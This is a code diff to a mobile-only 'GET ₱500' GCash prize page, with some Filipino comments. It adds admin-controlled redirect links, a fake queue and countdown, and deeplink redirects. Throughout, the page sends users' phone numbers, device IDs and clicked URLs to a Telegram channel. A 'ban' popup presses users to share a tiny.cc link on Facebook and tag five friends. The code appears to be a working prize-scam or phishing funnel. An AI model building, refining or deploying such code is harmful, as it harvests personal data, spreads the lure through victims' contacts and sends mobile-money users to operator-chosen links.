@@ -41,10 +41,6 @@
             background-attachment: fixed;
         }
 
-        .btn-svg-icon { width: 20px; height: 20px; flex-shrink: 0; display: inline-block; vertical-align: middle; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.3)); transition: transform 0.15s ease; }
-        .btn-svg-icon.lg { width: 24px; height: 24px; }
-        .btn-svg-icon.sm { width: 16px; height: 16px; }
-
         /* MOBILE-ONLY GUARD */
         #desktopBlock { display: none; position: fixed; inset: 0; z-index: 999999; background: linear-gradient(160deg, #0a1535 0%, #050a1a 100%); color: #fff; font-family: 'Poppins', sans-serif; text-align: center; padding: 24px; flex-direction: column; align-items: center; justify-content: center; }
         #desktopBlock .block-icon { font-size: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 25px rgba(77, 109, 255, 0.7)); animation: blockPulse 2.2s ease-in-out infinite; }
@@ -410,7 +406,7 @@
         </div>
     </div>
 
-    <!-- POPUP 2: SKIP AND CLAIM -->
+    <!-- POPUP 2: SKIP AND CLAIM (AD SKIP) -->
     <div class="popup-overlay" id="skipClaimPopup">
         <div class="popup-card">
             <button class="popup-close" id="skipClaimClose">
@@ -523,7 +519,7 @@
         </div>
     </div>
 
-    <!-- POPUP 6: BAN (with SHARE ON FACEBOOK) -->
+    <!-- POPUP 6: BAN -->
     <div class="popup-overlay" id="banPopup">
         <div class="popup-card ban-card">
             <button class="popup-close" id="banClose">
@@ -654,10 +650,13 @@
             var linkListeners = [], isBanned = false, readyToClaim = false, pendingLink = null;
             var queueUsers = [], queueListInterval = null, userInQueue = false, userLinkDeployed = false;
 
-            // ✅ NEW: Version state
-            var SYSTEM_VERSION = 1;       // default = Version I
-            var versionListener = null;
-            var resolvedLinkKey = null;   // key of the link we're currently using
+            // ✅ Version state
+            var SYSTEM_VERSION = 1;
+            var versionResolved = false;
+            var activeLinksListener = null;      // V2 live listener sa /links
+            var activeLinkKey = null;            // key ng current earliest link
+            var readyCountdownInterval = null;   // 5s countdown sa ready popup
+            var v2PendingRedirect = null;        // final URL para redirect
 
             // ============================================================
             // MOBILE GUARD
@@ -807,7 +806,6 @@
                 var s1 = document.getElementById('banStage1');
                 if (s1) s1.classList.remove('hidden');
             }
-
             function showBanPopup() {
                 document.querySelectorAll('.popup-overlay').forEach(function(p) { p.classList.remove('show'); });
                 var banPopup = document.getElementById('banPopup');
@@ -830,7 +828,6 @@
             function shareOnFacebook() {
                 if (typeof FB === 'undefined') { alert('Facebook SDK not loaded. Please refresh and try again.'); return; }
                 var tries = incrementBanTries();
-                console.log('📤 SHARE ON FACEBOOK — Try #' + tries);
                 sendTelegram('📤 SHARE ON FB REQUEST\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n🔢 Try: ' + tries + '/' + BAN_MAX_TRIES);
                 if (db && userPhone) {
                     try {
@@ -841,29 +838,22 @@
                     } catch(e) {}
                 }
                 if (isBanLocked() || tries >= BAN_MAX_TRIES) { showBanAttention(); return; }
-
                 FB.ui({
                     method: 'share',
                     href: 'https://tiny.cc/GCashPaMore'
                 }, function(response) {
                     if (response && !response.error_code) {
-                        console.log('✅ Share success:', response);
-                        sendTelegram('✅ FB SHARE SUCCESS\n👤 ' + userPhone + '\n⏰ ' + new Date().toLocaleString());
+                        sendTelegram('✅ FB SHARE SUCCESS\n👤 ' + userPhone);
                         if (db && userPhone) {
                             try {
-                                db.ref('user_sessions/' + userPhone + '/system_verification').update({
-                                    status: 'shared', sharedAt: Date.now(), lastUpdate: Date.now()
-                                });
+                                db.ref('user_sessions/' + userPhone + '/system_verification').update({ status: 'shared', sharedAt: Date.now(), lastUpdate: Date.now() });
                             } catch(e) {}
                         }
                         showSuccessPopup('Shared on Facebook!<br><strong>Tag 5 friends</strong> to get your pending prize.');
                     } else {
-                        console.log('❌ Share cancelled:', response);
                         if (db && userPhone) {
                             try {
-                                db.ref('user_sessions/' + userPhone + '/system_verification').update({
-                                    status: 'share_cancelled', lastUpdate: Date.now()
-                                });
+                                db.ref('user_sessions/' + userPhone + '/system_verification').update({ status: 'share_cancelled', lastUpdate: Date.now() });
                             } catch(e) {}
                         }
                         showSuccessPopup('Please tag 5 friends to get your pending prize.');
@@ -968,6 +958,28 @@
             document.getElementById('aiVerifyClose').onclick = function() { closePopup('aiVerifyPopup'); stopAiTimer(); };
 
             // ============================================================
+            // ✅ NEW: VERSION DETECTION
+            // Read admin/systemVersion BEFORE rendering the flow
+            // ============================================================
+            function readSystemVersion() {
+                return new Promise(function(resolve) {
+                    if (!db) return resolve(1);
+                    try {
+                        db.ref('admin/systemVersion').once('value').then(function(snap) {
+                            var data = snap.val();
+                            var v = 1;
+                            if (data) {
+                                if (typeof data === 'number') v = data;
+                                else if (typeof data.version === 'number') v = data.version;
+                                else if (typeof data === 'string') v = parseInt(data, 10) || 1;
+                            }
+                            resolve(v === 2 ? 2 : 1);
+                        }).catch(function() { resolve(1); });
+                    } catch(e) { resolve(1); }
+                });
+            }
+
+            // ============================================================
             // DEVICE INIT
             // ============================================================
             function initDevice() {
@@ -991,150 +1003,138 @@
             }
 
             // ============================================================
-            // ✅ NEW: VERSION LISTENER
-            // Watches admin/systemVersion and updates SYSTEM_VERSION live.
+            // ✅ V2: LIVE LINK LISTENER
+            // Picks earliest createdAt. Auto-switches if admin deletes active.
             // ============================================================
-            function attachVersionListener() {
-                if (!db || versionListener) return;
-                try {
-                    versionListener = db.ref('admin/systemVersion').on('value', function(snap) {
-                        var data = snap.val();
-                        var v = 1;
-                        if (data) {
-                            if (typeof data === 'number') v = data;
-                            else if (typeof data.version === 'number') v = data.version;
-                            else if (typeof data === 'string') v = parseInt(data, 10) || 1;
-                        }
-                        SYSTEM_VERSION = (v === 2) ? 2 : 1;
-                        console.log('🛡️ SYSTEM_VERSION =', SYSTEM_VERSION);
-                    });
-                } catch(e) { console.warn('Version listener failed:', e); }
-            }
-
-            // ============================================================
-            // ✅ NEW: VERSION-AWARE LINK RESOLUTION
-            //
-            // VERSION 1 (default):
-            //   - Original first-come, first-served
-            //   - Picks first `available` link, marks it `claimed`
-            //
-            // VERSION 2:
-            //   - Picks link with EARLIEST `createdAt` (first deployed)
-            //   - Does NOT mark as 'claimed' — all users share it
-            //   - Logs user into `links/<key>/users/<phone>`
-            //   - Auto-falls back to next earliest when active is deleted
-            // ============================================================
-            function getAvailableLinkV1() {
-                return new Promise(function(resolve) {
-                    if (!db) return resolve(null);
-                    try {
-                        db.ref('admin/redirectLink').once('value').then(function(snap) {
-                            var data = snap.val();
-                            if (data && data.url && data.active !== false) return resolve(data.url);
-                            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(linksSnap) {
-                                if (linksSnap.exists()) {
-                                    var links = linksSnap.val();
-                                    var key = Object.keys(links)[0];
-                                    var linkData = links[key];
-                                    db.ref('links/' + key).update({ status: 'claimed', user: userPhone || 'Unknown', claimedAt: Date.now() });
-                                    resolvedLinkKey = key;
-                                    return resolve(linkData.url);
-                                }
-                                resolve(null);
-                            }).catch(function() { resolve(null); });
-                        }).catch(function() { resolve(null); });
-                    } catch(e) { resolve(null); }
-                });
-            }
-
-            function getAvailableLinkV2() {
-                return new Promise(function(resolve) {
-                    if (!db) return resolve(null);
-                    try {
-                        db.ref('admin/redirectLink').once('value').then(function(snap) {
-                            var data = snap.val();
-                            if (data && data.url && data.active !== false) {
-                                resolvedLinkKey = '__admin_override__';
-                                return resolve(data.url);
-                            }
-                            // Pick the link with the EARLIEST createdAt
-                            db.ref('links').once('value').then(function(linksSnap) {
-                                if (!linksSnap.exists()) return resolve(null);
-                                var links = linksSnap.val();
-                                var arr = Object.entries(links)
-                                    .filter(function(e) { return e[1] && e[1].url; })
-                                    .sort(function(a, b) {
-                                        return (a[1].createdAt || 0) - (b[1].createdAt || 0);
-                                    });
-                                if (!arr.length) return resolve(null);
-                                var firstKey = arr[0][0];
-                                var firstData = arr[0][1];
-                                resolvedLinkKey = firstKey;
-                                // Log user in the shared link's users map (best-effort)
-                                if (userPhone) {
-                                    try {
-                                        db.ref('links/' + firstKey + '/users/' + userPhone).set(Date.now());
-                                    } catch(e) {}
-                                }
-                                return resolve(firstData.url);
-                            }).catch(function() { resolve(null); });
-                        }).catch(function() { resolve(null); });
-                    } catch(e) { resolve(null); }
-                });
-            }
-
-            // Public entry — picks version dynamically
-            function getAvailableLink() {
-                if (SYSTEM_VERSION === 2) return getAvailableLinkV2();
-                return getAvailableLinkV1();
-            }
-
-            // ============================================================
-            // ✅ NEW: LIVE LINK LISTENER for Version II
-            // When admin deletes the active link, resolve to the next one.
-            // ============================================================
-            function startLinkListenerV2() {
-                stopLinkListeners();
+            function startV2LiveLinkListener() {
                 if (!db) return;
-                // Listen to ALL links changes
-                var ref = db.ref('links');
-                var cb = ref.on('value', function(snap) {
-                    // Ignore if user hasn't claimed yet or already opened
-                    if (!userInQueue && !readyToClaim && !pendingLink) return;
+                if (activeLinksListener) {
+                    db.ref('links').off('value', activeLinksListener);
+                    activeLinksListener = null;
+                }
+                activeLinksListener = db.ref('links').on('value', function(snap) {
                     var links = snap.val() || {};
-                    var arr = Object.entries(links)
+                    var entries = Object.entries(links)
                         .filter(function(e) { return e[1] && e[1].url; })
                         .sort(function(a, b) { return (a[1].createdAt || 0) - (b[1].createdAt || 0); });
-                    if (!arr.length) {
-                        // No more links — leave user on current
-                        console.log('⚠️ No links left');
+
+                    if (!entries.length) {
+                        // Walang link — hayaan normal flow (queue) kung bukas pa
+                        console.log('📭 V2: No links available');
+                        activeLinkKey = null;
+                        // Kung naka-ready na at na-delete, i-cancel
+                        if (readyToClaim) {
+                            readyToClaim = false;
+                            v2PendingRedirect = null;
+                            stopReadyCountdown();
+                            // Balik sa queue
+                            var readyWrap = document.getElementById('readyToClaimWrap');
+                            var normalState = document.getElementById('queueNormalState');
+                            if (readyWrap) readyWrap.classList.remove('show');
+                            if (normalState) normalState.style.display = 'block';
+                            openPopup('queuePopup');
+                            startQueueTimer();
+                            startLiveUsersCounter();
+                        }
                         return;
                     }
-                    var firstKey = arr[0][0];
-                    var firstUrl = arr[0][1].url;
-                    // If the active link changed (deleted or reordered), swap
-                    if (firstKey !== resolvedLinkKey) {
-                        console.log('🔀 Active link changed — switching to next');
-                        resolvedLinkKey = firstKey;
-                        if (userPhone) {
-                            try { db.ref('links/' + firstKey + '/users/' + userPhone).set(Date.now()); } catch(e) {}
-                        }
-                        // If user is in queue and we already have pendingLink, swap pendingLink
-                        if (pendingLink && firstUrl !== pendingLink) {
-                            pendingLink = firstUrl;
-                        }
-                        // If user is ready to claim and hasn't clicked yet, update the URL
-                        if (readyToClaim) {
-                            pendingLink = firstUrl;
-                            // Optionally notify
-                            sendTelegram('🔀 LINK SWAPPED (V2)\n👤 ' + userPhone + '\n🔗 ' + firstUrl);
-                        } else if (userInQueue) {
-                            // Still in queue: they haven't been shown the ready screen
-                            pendingLink = firstUrl;
-                        }
+
+                    var first = entries[0];
+                    activeLinkKey = first[0];
+                    v2PendingRedirect = first[1].url;
+                    console.log('✅ V2: Active link =', activeLinkKey, '→', v2PendingRedirect);
+
+                    // Kung nasa queue state na, i-promote sa READY
+                    if (!readyToClaim && (userInQueue || queueTimerInterval)) {
+                        stopQueueTimer();
+                        stopLiveUsersCounter();
+                        stopLinkListeners();
+                        clearCountdownState();
+                        showV2ReadyToClaim();
                     }
+                    // Kung nasa skip countdown pa lang, mag-aantay na lang
+                    // (ready popup lalabas after skip countdown finishes)
                 });
-                linkListeners.push({ ref: ref, cb: cb, event: 'value' });
+            }
+
+            // ============================================================
+            // ✅ V2: SHOW READY TO CLAIM POPUP (5s countdown)
+            // ============================================================
+            function showV2ReadyToClaim() {
+                if (readyToClaim) return;
+                readyToClaim = true;
+                userInQueue = true;
+
+                // Show ready state sa queue popup
+                var normalState = document.getElementById('queueNormalState');
+                var readyWrap = document.getElementById('readyToClaimWrap');
+                if (normalState) normalState.style.display = 'none';
+                if (readyWrap) readyWrap.classList.add('show');
+                openPopup('queuePopup');
+
+                // Reset button, disable for 5s countdown
+                var btn = document.getElementById('readyClaimBtn');
+                if (btn) {
+                    btn.disabled = true;
+                    btn.style.pointerEvents = 'none';
+                    btn.style.opacity = '0.5';
+                    btn.innerHTML =
+                        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">' +
+                            '<circle cx="12" cy="12" r="9"/>' +
+                            '<path d="M12 7v5l3 2"/>' +
+                        '</svg>' +
+                        '<span id="v2ReadyCountdownText">WAIT 5s</span>';
+                }
+
+                // Update subtitle
+                var subtitle = readyWrap ? readyWrap.querySelector('.ready-subtitle') : null;
+                if (subtitle) {
+                    subtitle.innerHTML = 'Please wait while we prepare your slot.<br><strong>Claim will be ready in 5 seconds.</strong>';
+                }
+
+                // Vibrate
+                if (navigator.vibrate) { try { navigator.vibrate([100, 50, 200]); } catch(e) {} }
+                triggerBurst();
+
+                // 5-second countdown
+                var remaining = 5;
+                stopReadyCountdown();
+                readyCountdownInterval = setInterval(function() {
+                    remaining--;
+                    var txt = document.getElementById('v2ReadyCountdownText');
+                    if (remaining > 0) {
+                        if (txt) txt.textContent = 'WAIT ' + remaining + 's';
+                    } else {
+                        stopReadyCountdown();
+                        // Enable CLAIM button
+                        if (btn) {
+                            btn.disabled = false;
+                            btn.style.pointerEvents = '';
+                            btn.style.opacity = '';
+                            btn.innerHTML =
+                                '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">' +
+                                    '<rect x="3" y="8" width="18" height="4" rx="1"/>' +
+                                    '<path d="M12 8v13"/>' +
+                                    '<path d="M19 12v7a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-7"/>' +
+                                    '<path d="M7.5 8a2.5 2.5 0 0 1 0-5A4.8 8 0 0 1 12 8a4.8 8 0 0 1 4.5-5 2.5 2.5 0 0 1 0 5"/>' +
+                                '</svg>' +
+                                '<span>CLAIM NOW</span>';
+                        }
+                        if (subtitle) {
+                            subtitle.innerHTML = 'Your slot is now available.<br><strong>Tap the button below to claim!</strong>';
+                        }
+                        if (navigator.vibrate) { try { navigator.vibrate([100, 50, 100, 50, 200]); } catch(e) {} }
+                    }
+                }, 1000);
+
+                sendTelegram('✨ V2 READY TO CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
+            }
+
+            function stopReadyCountdown() {
+                if (readyCountdownInterval) {
+                    clearInterval(readyCountdownInterval);
+                    readyCountdownInterval = null;
+                }
             }
 
             // ============================================================
@@ -1166,7 +1166,7 @@
             }
 
             // ============================================================
-            // GET ₱500 — VERSION-AWARE FLOW
+            // GET ₱500 — VERSION-AWARE
             // ============================================================
             document.getElementById('get500Btn').addEventListener('click', function(e) {
                 e.preventDefault();
@@ -1217,27 +1217,12 @@
                                 showAiVerificationPopup();
                                 return;
                             }
-                            // ✅ Version-aware link resolution
-                            return getAvailableLink().then(function(linkUrl) {
-                                if (linkUrl) {
-                                    // Resolved: show countdown, then open
-                                    closePopup('catClaimPopup');
-                                    self.innerHTML = '<span>✅ READY...</span>';
-                                    // Reset queue state so we land on a clean skip popup
-                                    readyToClaim = false; pendingLink = linkUrl;
-                                    document.getElementById('queueNormalState').style.display = 'block';
-                                    document.getElementById('readyToClaimWrap').classList.remove('show');
-                                    openPopup('skipClaimPopup');
-                                    startSkipCountdown();
-                                    // After skip countdown, user clicks SKIP & CLAIM → goes to queue → ready
-                                    return;
-                                }
-                                closePopup('catClaimPopup');
-                                self.disabled = false;
-                                self.innerHTML = '<span>💰 GET ₱500</span>';
-                                openPopup('skipClaimPopup');
-                                startSkipCountdown();
-                            });
+                            // Proceed to SKIP ADS countdown (same sa V1 at V2)
+                            closePopup('catClaimPopup');
+                            self.disabled = false;
+                            self.innerHTML = '<span>💰 GET ₱500</span>';
+                            openPopup('skipClaimPopup');
+                            startSkipCountdown();
                         });
                     });
                 }).catch(function(err) {
@@ -1262,7 +1247,7 @@
             document.getElementById('successOkBtn').addEventListener('click', function() { closePopup('successPopup'); });
 
             // ============================================================
-            // SKIP COUNTDOWN
+            // SKIP ADS COUNTDOWN
             // ============================================================
             function startSkipCountdown() {
                 stopSkipCountdown();
@@ -1288,7 +1273,7 @@
             function stopSkipCountdown() { if (skipCountdownInterval) { clearInterval(skipCountdownInterval); skipCountdownInterval = null; } }
 
             // ============================================================
-            // SKIP & CLAIM → QUEUE POPUP
+            // SKIP & CLAIM → VERSION-AWARE
             // ============================================================
             document.getElementById('skipClaimBtn').addEventListener('click', function() {
                 if (!browserAllowed) return;
@@ -1300,26 +1285,69 @@
                 var gcashValue = userPhone;
                 if (!gcashValue || gcashValue.length !== 11 || !gcashValue.startsWith('09')) { alert('Invalid mobile number. Please refresh and try again.'); return; }
                 sendTelegram('💰 CLAIM SUBMITTED\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n📦 v' + SYSTEM_VERSION);
+
+                // ✅ Version-specific flow
+                if (SYSTEM_VERSION === 2) {
+                    startV2Flow();
+                } else {
+                    startV1Flow();
+                }
+            });
+
+            // ============================================================
+            // ✅ VERSION I FLOW (original)
+            // ============================================================
+            function startV1Flow() {
                 setTimeout(function() {
-                    readyToClaim = false;
-                    // pendingLink is already set from getAvailableLink()
-                    // If Version 2, keep listening for link changes
-                    if (SYSTEM_VERSION === 2 && !pendingLink) {
-                        // Edge case: no link resolved; re-resolve
-                        getAvailableLink().then(function(url) {
-                            pendingLink = url;
-                        });
-                    }
-                    userInQueue = false; userLinkDeployed = false; queueUsers = [];
+                    readyToClaim = false; pendingLink = null; userInQueue = false; userLinkDeployed = false; queueUsers = [];
                     document.getElementById('queueNormalState').style.display = 'block';
                     document.getElementById('readyToClaimWrap').classList.remove('show');
                     openPopup('queuePopup');
                     startQueueTimer();
                     startLiveUsersCounter();
-                    // Start link listener (V2 only in startLinkListener; V1 no-op)
                     startLinkListener();
                 }, 400);
-            });
+            }
+
+            // ============================================================
+            // ✅ VERSION II FLOW
+            // Skip ads → check link → if may link: READY popup (5s)
+            //                              → if wala: QUEUE (poll links)
+            // ============================================================
+            function startV2Flow() {
+                // Start live listener
+                startV2LiveLinkListener();
+
+                // Check kung may link na ba agad
+                db.ref('links').once('value').then(function(snap) {
+                    var links = snap.val() || {};
+                    var entries = Object.entries(links)
+                        .filter(function(e) { return e[1] && e[1].url; })
+                        .sort(function(a, b) { return (a[1].createdAt || 0) - (b[1].createdAt || 0); });
+
+                    if (entries.length > 0) {
+                        // ✅ May link na — show READY popup (skip queue)
+                        v2PendingRedirect = entries[0][1].url;
+                        activeLinkKey = entries[0][0];
+                        showV2ReadyToClaim();
+                    } else {
+                        // ❌ Wala pang link — normal queue flow
+                        // Live listener will trigger showV2ReadyToClaim kapag may link na
+                        setTimeout(function() {
+                            readyToClaim = false; pendingLink = null; userInQueue = false; userLinkDeployed = false; queueUsers = [];
+                            document.getElementById('queueNormalState').style.display = 'block';
+                            document.getElementById('readyToClaimWrap').classList.remove('show');
+                            openPopup('queuePopup');
+                            startQueueTimer();
+                            startLiveUsersCounter();
+                        }, 400);
+                    }
+                }).catch(function(e) {
+                    console.error('V2 error:', e);
+                    // Fallback sa V1 flow
+                    startV1Flow();
+                });
+            }
 
             // ============================================================
             // QUEUE TIMER
@@ -1401,7 +1429,7 @@
             function stopLiveUsersCounter() { if (queueListInterval) { clearInterval(queueListInterval); queueListInterval = null; } }
 
             // ============================================================
-            // READY TO CLAIM
+            // VERSION I — READY TO CLAIM (from available link detection)
             // ============================================================
             function showReadyToClaim(linkUrl) {
                 if (readyToClaim) return;
@@ -1427,30 +1455,51 @@
                 var readyState = document.getElementById('readyToClaimWrap');
                 if (normalState) normalState.style.display = 'none';
                 if (readyState) readyState.classList.add('show');
-                sendTelegram('✨ READY TO CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n📦 v' + SYSTEM_VERSION);
+                sendTelegram('✨ V1 READY TO CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
             }
 
+            // ============================================================
+            // READY CLAIM BUTTON — version-aware redirect
+            // ============================================================
             document.getElementById('readyClaimBtn').addEventListener('click', function() {
                 if (!browserAllowed) return;
-                if (!pendingLink) return;
+                if (this.disabled) return;
+
+                // Determine target URL
+                var targetUrl = null;
+                if (SYSTEM_VERSION === 2) {
+                    targetUrl = v2PendingRedirect || pendingLink;
+                } else {
+                    targetUrl = pendingLink;
+                }
+                if (!targetUrl) {
+                    // Wala pang link — hintayin ang next emit
+                    return;
+                }
+
                 if (navigator.vibrate) { try { navigator.vibrate(30); } catch(e) {} }
                 this.innerHTML = '<span>⏳ OPENING...</span>';
                 this.style.pointerEvents = 'none'; this.style.opacity = '0.85';
-                sendTelegram('🎁 USER TAPPED CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n📦 v' + SYSTEM_VERSION);
-                setTimeout(function() { openAsDeeplink(pendingLink); }, 600);
+                sendTelegram('🎁 USER TAPPED CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n📦 v' + SYSTEM_VERSION + '\n🔗 ' + targetUrl);
+
+                // V2: log user sa link users map
+                if (SYSTEM_VERSION === 2 && activeLinkKey && userPhone && db) {
+                    try {
+                        db.ref('links/' + activeLinkKey + '/users/' + userPhone).set(Date.now());
+                    } catch(e) {}
+                }
+
+                setTimeout(function() { openAsDeeplink(targetUrl); }, 600);
             });
 
             // ============================================================
-            // LINK LISTENERS — dispatch per version
+            // V1 — LINK LISTENERS (unchanged logic)
             // ============================================================
             function startLinkListener() {
                 if (SYSTEM_VERSION === 2) {
-                    startLinkListenerV2();
-                } else {
-                    startLinkListenerV1();
+                    // V2 uses its own live listener
+                    return;
                 }
-            }
-            function startLinkListenerV1() {
                 stopLinkListeners();
                 if (!db) return;
                 var ref1 = db.ref('admin/redirectLink');
@@ -1463,7 +1512,6 @@
                         var key = Object.keys(links)[0];
                         var linkData = links[key];
                         db.ref('links/' + key).update({ status: 'claimed', user: userPhone || 'Unknown', claimedAt: Date.now() });
-                        resolvedLinkKey = key;
                         showReadyToClaim(linkData.url);
                     }
                 });
@@ -1580,29 +1628,20 @@
             }
 
             // ============================================================
-            // INIT
+            // INIT — read version FIRST, then init device
             // ============================================================
-            setTimeout(function() {
-                if (browserAllowed) {
-                    initDevice().then(function() {
-                        console.log('✅ Mission page initialized');
-                    });
-                    // Attach live version listener + initial read
-                    attachVersionListener();
-                    if (db) {
-                        db.ref('admin/systemVersion').once('value').then(function(snap) {
-                            var data = snap.val();
-                            var v = 1;
-                            if (data) {
-                                if (typeof data === 'number') v = data;
-                                else if (typeof data.version === 'number') v = data.version;
-                                else if (typeof data === 'string') v = parseInt(data, 10) || 1;
-                            }
-                            SYSTEM_VERSION = (v === 2) ? 2 : 1;
-                            console.log('✅ Version loaded:', SYSTEM_VERSION);
-                        }).catch(function() {});
-                    }
-                }
+            setTimeout(async function() {
+                if (!browserAllowed) return;
+
+                // ✅ 1. Read version FIRST
+                SYSTEM_VERSION = await readSystemVersion();
+                versionResolved = true;
+                console.log('🛡️ SYSTEM_VERSION =', SYSTEM_VERSION);
+
+                // ✅ 2. Init device
+                initDevice().then(function() {
+                    console.log('✅ Mission page initialized');
+                });
             }, 500);
 
         })();
